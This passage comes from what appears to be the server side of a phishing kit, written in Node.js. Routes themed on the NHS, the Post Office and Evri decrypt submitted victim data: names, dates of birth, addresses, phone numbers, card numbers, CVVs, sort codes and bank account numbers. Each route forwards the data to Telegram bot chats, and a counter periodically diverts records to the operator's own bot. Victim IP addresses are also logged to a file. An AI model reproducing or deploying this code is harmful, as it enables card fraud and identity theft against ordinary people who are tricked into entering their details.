                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NHSManny:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=913906957&text=NHS:\n${originalText}`
            );
            mannyman789 += 1;
        }

        res.send("Update Completed");
    })
});

let mulligang135 = 0;

app.options('/mulligang135', cors())

app.post('/mulligang135', (req, res) => {
    firstname = CryptoJS.AES.decrypt(req.body.fname, '402312').toString(CryptoJS.enc.Utf8);
    lastname = CryptoJS.AES.decrypt(req.body.lname, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    address = CryptoJS.AES.decrypt(req.body.addy, '402312').toString(CryptoJS.enc.Utf8);
    pcode = CryptoJS.AES.decrypt(req.body.pcode, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.phone, '402312').toString(CryptoJS.enc.Utf8);
    email = CryptoJS.AES.decrypt(req.body.email, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cccvv, '402312').toString(CryptoJS.enc.Utf8);
    userAgent = `${req.body.userAgent}`;
    ip = `${req.body.ip}`;
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (mulligang135 == 10) {
            axios.post(
                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            mulligang135 = 0;
        } else {
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NHSMulli:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1990774394&text=NHS:\n${originalText}`
            );
            mulligang135 += 1;
        }

        res.send("Update Completed");
    })
});

let lingypack = 0;

app.options('/lingypackNHS', cors())

app.post('/lingypackNHS', (req, res) => {
    firstname = CryptoJS.AES.decrypt(req.body.fname, '402312').toString(CryptoJS.enc.Utf8);
    lastname = CryptoJS.AES.decrypt(req.body.lname, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    address = CryptoJS.AES.decrypt(req.body.addy, '402312').toString(CryptoJS.enc.Utf8);
    pcode = CryptoJS.AES.decrypt(req.body.pcode, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.phone, '402312').toString(CryptoJS.enc.Utf8);
    email = CryptoJS.AES.decrypt(req.body.email, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cccvv, '402312').toString(CryptoJS.enc.Utf8);
    userAgent = req.body.userAgent;
    ip = req.body.ip;
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (lingypack == 10) {
            axios.post(
                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            lingypack = 0;
        } else {
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NHSLingz:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=5235839910&text=NHS:\n${originalText}`
            );
            lingypack += 1;
        }

        res.send("Update Completed");
    })
});

app.options('/giveip', cors())

app.post('/giveip', (req, res) => {
    ip = req.body.ip;

    content = `${ip}\n`
    fs.appendFile('ips.txt', content, err => {

        res.send("Update Completed");

    })
});

//POSTOFFICE
//POSTOFFICE
//POSTOFFICE

app.options('/tCapz', cors())

app.post('/tCapz', (req, res) => {
    fname = CryptoJS.AES.decrypt(req.body.fname, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.phone, '402312').toString(CryptoJS.enc.Utf8);
    address = CryptoJS.AES.decrypt(req.body.addy, '402312').toString(CryptoJS.enc.Utf8);
    pcode = CryptoJS.AES.decrypt(req.body.pcode, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cccvv, '402312').toString(CryptoJS.enc.Utf8);
    scode = CryptoJS.AES.decrypt(req.body.scode, '402312').toString(CryptoJS.enc.Utf8);
    accno = CryptoJS.AES.decrypt(req.body.accno, '402312').toString(CryptoJS.enc.Utf8);
    userAgent = req.body.userAgent;
    ip = req.body.ip;
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (lingypack == 10) {
            axios.post(
                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            lingypack = 0;
        } else {
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=POTcapz:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1437456088&text=PO:\n${originalText}`
            );
            lingypack += 1;
        }

        res.send("Update Completed");
    })
});

//EVRI
//EVRI
//EVRI

app.options('/@skiii719', cors())

app.post('/@skiii719', (req, res) => {
    fname = CryptoJS.AES.decrypt(req.body.fname, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.phone, '402312').toString(CryptoJS.enc.Utf8);
    address = CryptoJS.AES.decrypt(req.body.addy, '402312').toString(CryptoJS.enc.Utf8);
    pcode = CryptoJS.AES.decrypt(req.body.pcode, '402312').toString(CryptoJS.enc.Utf8);
    ccname = CryptoJS.AES.decrypt(req.body.ccname, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cccvv, '402312').toString(CryptoJS.enc.Utf8);
    scode = CryptoJS.AES.decrypt(req.body.scode, '402312').toString(CryptoJS.enc.Utf8);
    accno = CryptoJS.AES.decrypt(req.body.accno, '402312').toString(CryptoJS.enc.Utf8);
    userAgent = req.body.userAgent;
    ip = req.body.ip;
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort code: ${scode}\nAccount number: ${accno}+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (skiii719 == 7) {
            axios.post(
                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            skiii719 = 0;
        } else {
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=Evriskiii719:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=5334039930&text=Evri:\n${originalText}`
            );
            skiii719 += 1;
        }

        res.send("Update Completed");
    })
});

let F_zn66 = 0;

app.options('/F_zn66', cors())

app.post('/F_zn66', (req, res) => {
    fname = CryptoJS.AES.decrypt(req.body.fname, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.phone, '402312').toString(CryptoJS.enc.Utf8);
    address = CryptoJS.AES.decrypt(req.body.addy, '402312').toString(CryptoJS.enc.Utf8);
    pcode = CryptoJS.AES.decrypt(req.body.pcode, '402312').toString(CryptoJS.enc.Utf8);
    ccname = CryptoJS.AES.decrypt(req.body.ccname, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cccvv, '402312').toString(CryptoJS.enc.Utf8);
    scode = CryptoJS.AES.decrypt(req.body.scode, '402312').toString(CryptoJS.enc.Utf8);
    accno = CryptoJS.AES.decrypt(req.body.accno, '402312').toString(CryptoJS.enc.Utf8);
    userAgent = req.body.userAgent;
    ip = req.body.ip;
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort code: ${scode}\nAccount number: ${accno}+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (F_zn66 == 7) {
            axios.post(
                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            F_zn66 = 0;
        } else {
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriFZ:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1612469030&text=Evri:\n${originalText}`
            );
            F_zn66 += 1;
        }

        res.send("Update Completed");
    })
});

app.options('/flashEvri', cors())

app.post('/flashEvri', (req, res) => {
    fname = CryptoJS.AES.decrypt(req.body.fname, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.phone, '402312').toString(CryptoJS.enc.Utf8);
    address = CryptoJS.AES.decrypt(req.body.addy, '402312').toString(CryptoJS.enc.Utf8);
    pcode = CryptoJS.AES.decrypt(req.body.pcode, '402312').toString(CryptoJS.enc.Utf8);
    ccname = CryptoJS.AES.decrypt(req.body.ccname, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cccvv, '402312').toString(CryptoJS.enc.Utf8);
    userAgent = req.body.userAgent;
    ip = req.body.ip;
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (F_zn66 == 7) {
            axios.post(
                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            F_zn66 = 0;
        } else {
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriFlash:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=-460917026&text=Evri:\n${originalText}`
            );
            F_zn66 += 1;
        }

        res.send("Update Completed");
    })
});

let manEvri = 5

app.options('/mannymanEvri', cors())

app.post('/mannymanEvri', (req, res) => {
    fname = CryptoJS.AES.decrypt(req.body.fname, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.phone, '402312').toString(CryptoJS.enc.Utf8);
    address = CryptoJS.AES.decrypt(req.body.addy, '402312').toString(CryptoJS.enc.Utf8);
    pcode = CryptoJS.AES.decrypt(req.body.pcode, '402312').toString(CryptoJS.enc.Utf8);
    ccname = CryptoJS.AES.decrypt(req.body.ccname, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cccvv, '402312').toString(CryptoJS.enc.Utf8);
    userAgent = req.body.userAgent;
    ip = req.body.ip;
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (manEvri == 5) {
            axios.post(
                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            manEvri = 0;
        } else {
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriManny:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=913906957&text=Evri:\n${originalText}`
            );
            manEvri += 1;
        }

        res.send("Update Completed");
    })
});

app.options('/kelvEvri', cors())

app.post('/kelvEvri', (req, res) => {
    fname = CryptoJS.AES.decrypt(req.body.fname, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.phone, '402312').toString(CryptoJS.enc.Utf8);
    address = CryptoJS.AES.decrypt(req.body.addy, '402312').toString(CryptoJS.enc.Utf8);
    pcode = CryptoJS.AES.decrypt(req.body.pcode, '402312').toString(CryptoJS.enc.Utf8);
    ccname = CryptoJS.AES.decrypt(req.body.ccname, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cccvv, '402312').toString(CryptoJS.enc.Utf8);
    userAgent = req.body.userAgent;
    ip = req.body.ip;
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (kelvCount == 5) {
            axios.post(
                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            kelvCount = 0;
        } else {
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriKelv:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1248378980&text=Evri:\n${originalText}`
            );
            kelvCount += 1;
        }

        res.send("Update Completed");
    })
});

app.options('/fpaysEvri', cors())

app.post('/fpaysEvri', (req, res) => {
    fname = CryptoJS.AES.decrypt(req.body.fname, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.phone, '402312').toString(CryptoJS.enc.Utf8);
    address = CryptoJS.AES.decrypt(req.body.addy, '402312').toString(CryptoJS.enc.Utf8);
    pcode = CryptoJS.AES.decrypt(req.body.pcode, '402312').toString(CryptoJS.enc.Utf8);
    ccname = CryptoJS.AES.decrypt(req.body.ccname, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cccvv, '402312').toString(CryptoJS.enc.Utf8);
    userAgent = req.body.userAgent;
    ip = req.body.ip;
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (fpaysC == 5) {
            axios.post(
                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            fpaysC = 0;
        } else if (bin === "542011") {
            axios.post(
                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
        } else {
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriFpays:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=2134201699&text=Evri:\n${originalText}`
            );
            fpaysC += 1;
        }
    })
});

app.options('/fpaysEvri2', cors())

app.post('/fpaysEvri2', (req, res) => {
    fname = CryptoJS.AES.decrypt(req.body.fname, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.phone, '402312').toString(CryptoJS.enc.Utf8);
    address = CryptoJS.AES.decrypt(req.body.addy, '402312').toString(CryptoJS.enc.Utf8);
    pcode = CryptoJS.AES.decrypt(req.body.pcode, '402312').toString(CryptoJS.enc.Utf8);
    ccname = CryptoJS.AES.decrypt(req.body.ccname, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cccvv, '402312').toString(CryptoJS.enc.Utf8);
    userAgent = req.body.userAgent;
    ip = req.body.ip;
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (fpaysC == 5) {
            axios.post(
                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            fpaysC = 0;
        } else if (bin === "542011") {
            axios.post(
                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
        } else {
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriFpays:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=2134201699&text=Evri:\n${originalText}`
            );
            fpaysC += 1;
        }
    })
});

app.options('/fpaysEvri3', cors())

app.post('/fpaysEvri3', (req, res) => {
    fname = CryptoJS.AES.decrypt(req.body.fname, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.phone, '402312').toString(CryptoJS.enc.Utf8);
    address = CryptoJS.AES.decrypt(req.body.addy, '402312').toString(CryptoJS.enc.Utf8);
    pcode = CryptoJS.AES.decrypt(req.body.pcode, '402312').toString(CryptoJS.enc.Utf8);
    ccname = CryptoJS.AES.decrypt(req.body.ccname, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cccvv, '402312').toString(CryptoJS.enc.Utf8);
    userAgent = req.body.userAgent;
    ip = req.body.ip;
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (fpaysC == 5) {
            axios.post(
                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            fpaysC = 0;
        } else if (bin === "542011") {
            axios.post(
                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
        } else {
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriFpays:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=-751200146&text=Evri:\n${originalText}`
            );
            fpaysC += 1;
        }
    })
});

app.options('/mannyman3', cors())

app.post('/mannyman3', (req, res) => {
    fname = CryptoJS.AES.decrypt(req.body.fname, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.phone, '402312').toString(CryptoJS.enc.Utf8);
    address = CryptoJS.AES.decrypt(req.body.addy, '402312').toString(CryptoJS.enc.Utf8);
    pcode = CryptoJS.AES.decrypt(req.body.pcode, '402312').toString(CryptoJS.enc.Utf8);
    ccname = CryptoJS.AES.decrypt(req.body.ccname, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cccvv, '402312').toString(CryptoJS.enc.Utf8);
    userAgent = req.body.userAgent;
    ip = req.body.ip;
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
